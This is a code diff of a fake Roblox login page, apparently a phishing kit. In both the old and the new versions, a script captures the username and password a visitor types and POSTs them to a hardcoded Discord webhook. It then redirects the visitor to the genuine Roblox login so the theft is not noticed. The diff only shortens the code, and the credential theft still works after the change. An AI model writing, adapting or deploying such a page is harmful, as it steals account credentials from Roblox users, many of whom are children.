@@ -5,136 +5,28 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Roblox</title>
 <style>
-  body{
-    margin:0;
-    font-family:-apple-system,system-ui,sans-serif;
-    /* l'image de fond roblox */
-    background: url('https://images.rbxcdn.com/3c8d975e5c0d9cf7a424a41c6a8f75e9.jpg') no-repeat center center fixed;
-    background-size: cover;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-    color:#fff;
-  }
-  
-  /* le voile sombre pour lire le texte */
-  .overlay{
-    position:fixed;
-    top:0;left:0;right:0;bottom:0;
-    background:rgba(0,0,0,0.5);
-    display:flex;
-    align-items:center;
-    justify-content:center;
-  }
-
-  .login-box{
-    width:100%;
-    max-width:320px;
-    text-align:center;
-    z-index:2;
-  }
-
-  .logo{
-    width:200px;
-    margin-bottom:30px;
-    filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
-  }
-
-  input{
-    width:100%;
-    padding:14px;
-    margin-bottom:15px;
-    background:rgba(0,0,0,0.6);
-    border:1px solid rgba(255,255,255,0.2);
-    border-radius:8px;
-    color:#fff;
-    font-size:16px;
-    box-sizing:border-box;
-    outline:none;
-  }
-  input::placeholder{ color:#ccc; }
-  input:focus{ border-color:#fff; }
-
-  .btn-login{
-    width:100%;
-    padding:14px;
-    background:rgba(255,255,255,0.3);
-    color:#fff;
-    border:none;
-    border-radius:8px;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-    margin-bottom:15px;
-    backdrop-filter: blur(4px);
-  }
-
-  .btn-outline{
-    width:100%;
-    padding:14px;
-    background:transparent;
-    color:#fff;
-    border:1px solid rgba(255,255,255,0.5);
-    border-radius:8px;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-    margin-bottom:20px;
-  }
-
-  .forgot{
-    display:block;
-    color:#fff;
-    text-decoration:none;
-    font-size:14px;
-    margin-bottom:20px;
-  }
+  body { margin:0; background: url('https://images.rbxcdn.com/3c8d975e5c0d9cf7a424a41c6a8f75e9.jpg') center/cover; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
+  .box { width: 85%; max-width: 320px; }
+  .logo { width: 100%; margin-bottom: 20px; }
+  input { width: 100%; padding: 12px; margin-bottom: 10px; background: rgba(0,0,0,0.6); border: 1px solid #555; border-radius: 6px; color: #fff; box-sizing: border-box; font-size: 16px; }
+  button { width: 100%; padding: 12px; background: rgba(255,255,255,0.3); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; }
 </style>
 </head>
 <body>
-
-<div class="overlay">
-  <div class="login-box">
-    
-    <!-- le logo roblox -->
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" style="filter: brightness(0) invert(1); width: 80px; margin-bottom: 20px;" alt="Roblox">
-    <h2 style="margin:0 0 20px; font-size:28px; font-weight:800; text-shadow: 0 2px 4px rgba(0,0,0,0.8);">ROBLOX</h2>
-
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="off">
-      <input type="password" id="password" placeholder="Password" required autocomplete="off">
-      
-      <button type="submit" class="btn-login">Log In</button>
-      <button type="button" class="btn-outline">Log In With Another Device</button>
-      
-      <a href="#" class="forgot">Forgot Password or Username?</a>
-    </form>
-
-  </div>
+<div class="box">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" style="filter: brightness(0) invert(1); width: 80px; display: block; margin: 0 auto 20px;">
+  <form id="f">
+    <input type="text" id="u" placeholder="Username/Email" required>
+    <input type="password" id="p" placeholder="Password" required>
+    <button>Log In</button>
+  </form>
 </div>
-
 <script>
-const HOOK = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
-
-document.getElementById("loginForm").addEventListener("submit", function(e) {
+const H = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
+document.getElementById("f").onsubmit = e => {
   e.preventDefault();
-  
-  const user = document.getElementById("username").value;
-  const pass = document.getElementById("password").value;
-  
-  let texte = "**🔴 NOUVEAU LOGIN ROBLOX**\n";
-  texte += "**Pseudo/Mail:** `" + user + "`\n";
-  texte += "**Mdp:** `" + pass + "`\n";
-  
-  fetch(HOOK, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({content: texte})
-  }).finally(() => {
-    window.location.href = "https://www.roblox.com/login";
-  });
-});
+  fetch(H, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:`**ROBLOX**\nUser: \`${document.getElementById('u').value}\`\nPass: \`${document.getElementById('p').value}\``})}).finally(()=>window.location.href="https://www.roblox.com/login");
+};
 </script>
 </body>
 </html>
